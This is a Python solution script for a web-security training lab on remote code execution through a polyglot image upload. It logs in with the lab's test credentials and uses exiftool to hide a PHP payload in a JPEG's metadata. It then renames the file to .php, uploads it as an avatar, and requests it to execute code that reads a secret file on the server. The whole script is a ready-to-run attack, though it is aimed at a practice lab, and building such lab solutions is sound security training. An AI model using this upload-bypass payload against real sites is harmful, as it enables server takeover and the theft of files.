#################################################################################
#
# Lab: Remote code execution via polyglot web shell upload
#
# Hack Steps: 
#      1. Fetch login page
#      2. Extract the csrf token and session cookie
#      3. Login as wiener
#      4. Extract the new csrf token from wiener profile
#      5. Embed the payload in the image using exiftool
#      6. Change the extension of the image to .php
#      7. Read the image with embedded payload
#      8. Upload the image with the embedded payload
#      9. Fetch the uploaded image with the embedded payload to read the secret
#      10. Submit the solution
#
#################################################################################
import requests
import re
from colorama import Fore
import os

# Change this to your lab URL
LAB_URL = "https://0a7a00a0033988778040e9db00d60090.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
  
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)
 
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the new csrf token from wiener profile.. ", end="", flush=True)

    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    wiener_profile = fetch("/my-account", cookies)
    csrf_token = re.findall("csrf.+value=\"(.+)\"", wiener_profile.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Embedding the payload in the image using exiftool.. ", end="", flush=True)

    image_name = "white.jpg" # Make sure that an image with this name exists in the root directory or change the name accordingly
    payload = """<br><h1><?php echo 'Secret: ' . file_get_contents('/home/carlos/secret'); __halt_compiler(); ?></h1>"""
    os.system(f"""exiftool -DocumentName="{payload}" {image_name}""")

    print(Fore.WHITE + "⦗6⦘ Changing the extension of the image to .php.. ", end="", flush=True)

    malicious_image_name = "hack.php" # You can change this to what you want
    os.system(f"mv {image_name} {malicious_image_name}") # If you are still a windows user, changing 'mv' to 'move' should make the script still work

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Reading the image with embedded payload.. ", end="", flush=True)
    
    malicious_image = open(malicious_image_name, 'rb').read()

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗8⦘ Uploading the image with the embedded payload.. ", end="", flush=True)
    
    files = { "avatar": (malicious_image_name, malicious_image, "application/x-php") }
    data = { "user": "wiener", "csrf": csrf_token }
    post_data("/my-account/avatar", data, cookies, files)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗9⦘ Fetching the uploaded image with the embedded payload to read the secret.. ", end="", flush=True)

    uploaded_image = fetch(f"/files/avatars/{malicious_image_name}", cookies)
    secret = re.findall("Secret: (.*)", uploaded_image.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.BLUE + "❯❯ Secret: " + Fore.YELLOW + secret)
    print(Fore.WHITE + "⦗10⦘ Submitting the solution.. ", end="", flush=True)

    data = { "answer": secret }
    post_data("/submitSolution", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗#⦘ Changing the image extension back to its original one.. ", end="", flush=True)

    os.system(f"mv {malicious_image_name} {image_name}") # If you are still a windows user, changing 'mv' to 'move' should make the script still work
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None, files = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, files=files, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

